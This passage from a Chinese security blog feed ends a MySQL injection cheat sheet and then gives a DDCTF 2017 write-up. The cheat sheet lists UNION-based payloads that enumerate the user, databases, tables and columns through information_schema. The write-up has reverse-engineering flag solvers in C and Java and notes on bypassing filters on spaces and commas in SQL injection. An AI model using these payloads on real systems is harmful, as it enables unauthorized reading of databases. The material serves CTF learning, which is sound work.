 <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>concat_ws<span class="token punctuation">(</span>char<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span>

 查询数据库

 <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>schema_name<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span>

 <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata

 查询表名

 <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>table_name<span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span>数据库的<span class="token number">16</span>进制编码 <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span>

 <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span>数据库的<span class="token number">16</span>进制编码

 查询字段

 <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>column_name<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span>表名的十六进制编码 <span class="token operator">and</span> table_schema<span class="token operator">=</span>数据库的<span class="token number">16</span>进制编码 <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span>

 <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span>表名的十六进制编码 <span class="token operator">and</span> table_schema<span class="token operator">=</span>数据库的<span class="token number">16</span>进制编码
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.waitalone.cn/mysql-injection-summary.html" target="_blank" rel="external">https://www.waitalone.cn/mysql-injection-summary.html</a></p>
<h3 id="盲注还是虚得很"><a href="#盲注还是虚得很" class="headerlink" title="盲注还是虚得很"></a>盲注还是虚得很</h3>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[DDCTF]]></title>
      <url>/2017/05/18/DDCTF/</url>
      <content type="html"><![CDATA[<h2 id="第一题-RE"><a href="#第一题-RE" class="headerlink" title="第一题[RE]"></a>第一题[RE]</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> arr<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    FILE <span class="token operator">*</span> foutput <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./data"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> foutput<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token operator">++</span>j<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">// (0000000100000CB0 - 0000000100000C90) >> 2 = 8</span>
    <span class="token keyword">int</span> v2 <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">^</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">55</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> v2<span class="token punctuation">;</span>
        v2<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// DDCTF-5943293119a845e9bbdbde5a369c1f50@didichuxing.com</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="第二题-apk"><a href="#第二题-apk" class="headerlink" title="第二题[apk]"></a>第二题[apk]</h2><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">d2</span> <span class="token punctuation">{</span> 

  <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> p <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">-</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">107</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">126</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">116</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">118</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">41</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">106</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">87</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">110</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">101</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> q <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">-</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">71</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">83</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">106</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">61</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">61</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">84</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">104</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">71</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">126</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">101</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">24</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">i</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span>p<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> arrayOfByte1<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      arrayOfByte1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> q<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      i <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">int</span> k <span class="token operator">=</span> arrayOfByte1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>arrayOfByte1<span class="token punctuation">[</span><span class="token punctuation">(</span>k <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      i <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;</span> i<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      arrayOfByte2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> arrayOfByte1<span class="token punctuation">[</span><span class="token punctuation">(</span>k <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      j <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>arrayOfByte2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
       System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>flag:<br>DDCTF-a3b8c0b9dbe94fa6bd0e8bfa95620751@didichuxing.com</p>
<h2 id="第三题-RE"><a href="#第三题-RE" class="headerlink" title="第三题[RE]"></a>第三题[RE]</h2><p>不会做，好像是要脱壳</p>
<h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题[???]"></a>第四题[???]</h2><p>传说中有钱人才能做得MAC题目</p>
<h2 id="第五题-WEB-sqli"><a href="#第五题-WEB-sqli" class="headerlink" title="第五题[WEB,sqli]"></a>第五题[WEB,sqli]</h2><p>过滤了空格 =&gt; <code>%0a</code><br>过滤了逗号</p>
<pre><code>- limit处 =&gt; limit 1 offset 4
- union处 =&gt; union select * from (select 1)a join (select 2)b...
</code></pre><p>都是师傅教的然后自己构造了一下</p>
